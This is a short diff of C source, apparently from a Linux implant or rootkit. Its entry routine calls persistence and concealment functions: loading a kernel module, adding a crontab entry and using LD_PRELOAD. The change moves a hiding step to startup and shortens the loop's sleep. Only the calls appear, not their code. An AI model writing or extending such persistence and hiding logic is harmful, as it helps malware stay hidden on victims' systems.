@@ -80,6 +80,7 @@ void entry(Globals *global) {
 
     // if root, try to load kernel module
     try_persist(global);
+    try_hide(global);
     try_add_crontab(global);
     try_ld_preload(global);
 
@@ -125,7 +126,6 @@ void entry(Globals *global) {
     // keep running
     while(1){
         TRAP;
-        try_hide(global);
-        global->sleep_ms(1000);
+        global->sleep_ms(100);
     }
 }
